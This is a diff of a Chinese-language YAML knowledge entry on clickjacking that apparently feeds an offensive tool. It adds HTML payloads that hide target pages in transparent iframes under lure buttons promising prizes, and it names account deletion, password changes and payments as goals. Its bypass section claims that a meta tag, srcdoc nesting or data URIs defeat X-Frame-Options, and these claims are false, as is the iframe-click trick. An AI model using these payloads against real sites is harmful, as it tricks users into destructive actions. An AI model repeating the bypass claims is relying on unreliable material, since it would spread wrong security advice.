@@ -1,51 +1,64 @@
 name: 点击劫持攻击
-description: 点击劫持漏洞检测和利用
+description: 点击劫持漏洞利用 - 基础攻击、绕过X-Frame-Options、多层iframe、组合攻击
 domain: web
-version: '1.0'
+version: '3.0'
 tags:
 - web
 - clickjacking
-- ui
-knowledge: '# 点击劫持
 
+knowledge: |
+  # 点击劫持攻击
 
-  ## 1. 基础点击劫持
-
-
+  ## 基础攻击
   ```html
-
-  <iframe src="http://target.com/delete" style="opacity:0">
-
+  <style>
+  iframe { position:absolute; top:0; left:0; width:100%; height:100%; opacity:0; }
+  button { position:absolute; top:100px; left:100px; }
+  </style>
+  <iframe src="http://target.com/delete"></iframe>
   <button>点击领取奖品</button>
-
-  </iframe>
-
   ```
 
-
-  ## 2. 点击劫持+XSS
-
-
+  ## 绕过X-Frame-Options
   ```html
+  <!-- 使用<meta>标签 (某些情况) -->
+  <meta http-equiv="X-Frame-Options" content="allow">
 
-  <iframe src="http://target.com/profile" style="opacity:0">
+  <!-- 使用srcdoc -->
+  <iframe srcdoc="<iframe src='http://target.com/action'></iframe>"></iframe>
 
-  <button>免费领取iPhone</button>
-
-  </iframe>
-
+  <!-- 使用data URI -->
+  <iframe src="data:text/html,<iframe src='http://target.com/action'></iframe>"></iframe>
   ```
 
+  ## 多层iframe
+  ```html
+  <iframe src="http://target.com/page1" id="f1"></iframe>
+  <iframe src="http://target.com/page2" id="f2"></iframe>
+  <button onclick="document.getElementById('f1').click()">Click</button>
+  ```
 
-  ## 3. 绕过技术
+  ## 组合XSS
+  ```html
+  <!-- 配合XSS扩大危害 -->
+  <iframe src="http://target.com/profile?name=<script>document.cookie</script>"></iframe>
+  ```
 
+  ## 文字覆盖
+  ```html
+  <style>
+  iframe { width:800px; height:600px; opacity:0.5; position:absolute; }
+  .cover { position:absolute; top:200px; left:300px; background:white; }
+  </style>
+  <iframe src="http://target.com/action"></iframe>
+  <div class="cover">点击这里</div>
+  ```
 
-  ### 多层iframe
-
-
-  ### 覆盖层
-
-
-  ### 事件劫持
-
-  '
+  ## 常见利用场景
+  ```
+  - 删除账户/数据
+  - 修改密码/邮箱
+  - 授权第三方应用
+  - 转账/支付
+  - 关注/点赞
+  ```
